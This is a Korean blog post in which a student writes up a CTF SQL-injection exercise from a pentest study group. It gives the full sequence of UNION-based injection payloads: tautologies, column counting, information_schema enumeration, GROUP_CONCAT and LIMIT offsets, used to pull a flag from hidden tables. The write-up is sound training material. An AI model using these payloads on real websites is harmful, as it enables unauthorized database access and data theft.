---
layout: post
title:  노말틱 모의해킹 스터디 6주차 CTF 문제 (2)
author: leewoojin
date: 2025-05-09 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

검색창에 `normaltic`을 입력한 결과, 정상적인 검색 결과 동작을 확인할 수 있었습니다. 

<img width="1175" alt="Image" src="https://github.com/user-attachments/assets/56890963-3229-4c48-a687-a9143f60d1d7" />

실수로 SQL 주석(--)을 붙이지 않고 `' OR '1'='1` 만 입력해봤더니 
`doldol`의 계정에서  Info 부분에서 `"my name is normaltic"`
출력하는 것을 확인했습니다. 

<img width="1172" alt="Image" src="https://github.com/user-attachments/assets/b44f8ecc-3341-4a44-b0b4-2b40fd518335" />

`' OR '1'='1-- `  입력해봤더니 `doldol`의 원래 계정대로 출력되는 것을 확인할 수 있었습니다. 

<img width="1155" alt="Image" src="https://github.com/user-attachments/assets/c1126c8b-2fff-4213-bae1-d7d3f5a5c4ae" />


`doldol' UNION SELECT 1,2,3,4,5,6-- `를 입력하여 컬럼이 6개라는 것을 확인했습니다. 
<img width="1161" alt="Image" src="https://github.com/user-attachments/assets/9a5de7b2-6b75-44ef-85ce-3016283d22ac" />

`doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,6-- `
Info부분에 6이 찍히는 것을 확인할 수 있습니다. 
<img width="1156" alt="Image" src="https://github.com/user-attachments/assets/fabf6106-9485-4ed5-95d1-1d6c48a8fe55" />

`doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,database()-- `
DB 이름이 sqli_5 라는 것을 확인할 수 있습니다.
<img width="1168" alt="Image" src="https://github.com/user-attachments/assets/d00cfe96-5a49-49ee-bc5a-f4ebcde4e707" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema='sqli_5'-- 
```
> 테이블 이름이 flag_honey 라는 것을 확인 
<img width="1142" alt="Image" src="https://github.com/user-attachments/assets/c9326907-2abc-4960-94ed-0da66ac5f188" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='flag_honey'-- 
```
> flag_honey 테이블에서 flag를 발견
<img width="1145" alt="Image" src="https://github.com/user-attachments/assets/6dc80c99-7926-46d9-95d7-052aa429cad8" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM flag_honey-- 
```
> 하핳 아니라네 ;ㅁ;
<img width="1149" alt="Image" src="https://github.com/user-attachments/assets/ab915c23-1d40-4a97-b22d-97776372ee7a" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables--
```
> 어디서 놓친게 있나 생각해봐도 없는데 information_schema.tables에 where 조건문을 안쓰면 테이블이 왕창 나온다는 것을 기억하고 확인해보니 CHARACTER_SETS 테이블이 있는 것을 확인

<img width="1171" alt="Image" src="https://github.com/user-attachments/assets/9ed76ed7-ada8-4001-a22e-eeaada16c9aa" />

### ❗ 여기서부터 삽질의 하이라이트

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='CHARACTER_SETS'--
```
> CHARACTER_SET_NAME 컬럼 발견
<img width="1127" alt="Image" src="https://github.com/user-attachments/assets/f1c5eed3-1c11-4373-b2bd-e7adeac12530" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,CHARACTER_SET_NAME FROM CHARACTER_SETS-- 
```
> 이렇게 했더니 안나온다 왜?!?!?!?!?!?!?

`doldol' AND 1=0 UNION SELECT 1,2,3,4,5,user()-- `
> 이게 또 database()만 있는게 아니구나 
<img width="1157" alt="Image" src="https://github.com/user-attachments/assets/f5eab93f-3b99-4071-bbb9-8843a1f0b798" />

```sql
doldol' and '1'='0' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables LIMIT 1,1-- 
```
> information_schema.tables 에서 하나만 나온다는게 Limit 가 걸려있다는 거였는데 너무 늦게 알았다..

<img width="1138" alt="Image" src="https://github.com/user-attachments/assets/a84caa94-4b7f-438d-9ca9-bfce2e48b644" />


### 정신 차린 구간 

```sql
doldol' AND '1'='0' UNION SELECT 1,2,3,4,5,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'--
```
> flag_honey 테이블 말고도 game_user,secret 존재한다는 것을 확인 
<img width="1141" alt="Image" src="https://github.com/user-attachments/assets/31aa482f-907e-410d-aed4-0b3b285b1627" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='secret'-- 
```
> 수상해보이는 sceret 테이블에서 flag 컬럼을 확인했습니다.
<img width="1145" alt="Image" src="https://github.com/user-attachments/assets/32a7d3b5-0ca0-4439-a0b6-ed436da71030" />

```sql	
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM secret-- 
```
> 하핳하.. 또 속았다. 
<img width="1130" alt="Image" src="https://github.com/user-attachments/assets/897b0be2-2878-45b1-86c6-a6fde2647e87" />

```sql
doldol' and '1' ='0' UNION SELECT 1,2,3,4,5,flag FROM secret LIMIT 1,1-- 
```
> 휴 드디어 찾았다


### 문제에서 배운 것 정리 
SQL에서 `LIMIT`은 **쿼리 결과의 행 수를 제한**할 때 사용됩니다.  
MySQL 기준으로 `LIMIT a, b`는 다음을 의미합니다:

- `a` : **건너뛸 행(row)의 개수** (offset)
- `b` : **가져올 행(row)의 개수**

```
... FROM secret LIMIT 0,1--  → 첫 번째 레코드  
... FROM secret LIMIT 1,1--  → 두 번째 레코드  
... FROM secret LIMIT 2,1--  → 세 번째 레코드
```

| 구문                                | 용도                    | 예시                  |
| --------------------------------- | --------------------- | ------------------- |
| `LIMIT 0,5`                       | 처음부터 5개 행 출력          | 목록 출력용              |
| `ORDER BY id DESC LIMIT 1`        | 가장 최근 행 출력            | 마지막 레코드 접근          |
| `LIMIT n`                         | 상위 n개 행만 출력           | `LIMIT 10` → 상위 10개 |
| `OFFSET n`                        | (PostgreSQL에서) n개 건너뜀 | `OFFSET 3 LIMIT 1`  |
| `WHERE id = (SELECT MIN(id) ...)` | 첫 번째 값 찾기             | 단일 행 정렬 불가능할 때      |


